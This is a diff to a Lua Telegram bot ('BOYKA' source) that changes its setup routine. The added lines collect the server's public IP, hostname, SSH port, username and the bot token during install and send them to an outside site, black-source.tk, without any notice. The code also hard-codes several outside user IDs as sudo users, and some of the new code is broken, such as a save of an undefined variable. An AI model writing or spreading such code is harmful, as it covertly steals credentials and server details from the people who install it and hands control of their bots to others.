@@ -38,14 +38,24 @@ os.execute('lua BOYKA.lua')
 end
 if not database:get(id_server..":SUDO:ID") then
 io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m')
-local SUDOID = io.read()
-if SUDOID ~= '' then
-io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
-database:set(id_server..":SUDO:ID",SUDOID)
-else
-print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
-end 
+local SUDOID = io.read():gsub(' ','') 
+if tostring(SUDOID):match('%d+') then
+data,res = https.request("https://black-source.tk/BlackTeAM/info.php?n=BY&bn=info&id="..SUDOID)
+if res == 200 then
+muaed = json:decode(data)
+if muaed.Info.info == 'Is_Spam' then
+io.write('\n\27[1;31mالايدي محظور من السورس\n\27[0;39;49m')
 os.execute('lua BOYKA.lua')
+end ---ifBn
+if muaed.Info.info == 'Ok' then
+io.write('\n\27[1;31m تم حفظ الايدي\n\27[0;39;49m')
+database:set(Server_Done.."UserSudo_Write",Id)
+end ---ifok
+else
+io.write('\n\27[1;31mالايدي مينحفظ\n\27[0;39;49m')
+end  ---ifid
+os.execute('lua BOYKA.lua')
+end ---ifnot
 end
 if not database:get(id_server..":SUDO:USERNAME") then
 io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
@@ -69,8 +79,13 @@ end
 create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
+IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
+Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
+Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
+Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
+local t = json:decode(https.request('https://black-source.tk/BlackTeAM/info.php?n=BY&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..install.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+print('\n\27[1;34m::Source Boyka::')
 file = io.open("BOYKA", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -173,7 +188,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1264922434,1355955429,1033028167,665877797}   
+sudo_users = {SUDO,1264922434,1355955429,1033028167}   
 function SudoBot(msg)  
 local BOYKA = false  
 for k,v in pairs(sudo_users) do  
@@ -905,7 +920,7 @@ send(msg.sender_user_id_, msg.id_,' ❃∫ تم ارسال رسالتك\n ❃∫
 tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
 vardump(data)
-if data and data.messages_[0].content_.sticker_ then
+if data and data.messages_.content_.sticker_ then
 local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
 local Text = ' ❃∫ تم ارسال الملصق من ↓\n - '..Name
 sendText(SUDO,Text,0,'md')
@@ -11102,23 +11117,5 @@ tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100'
 end
 end
 end
-
-
 end -- end new msg
 end -- end callback
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
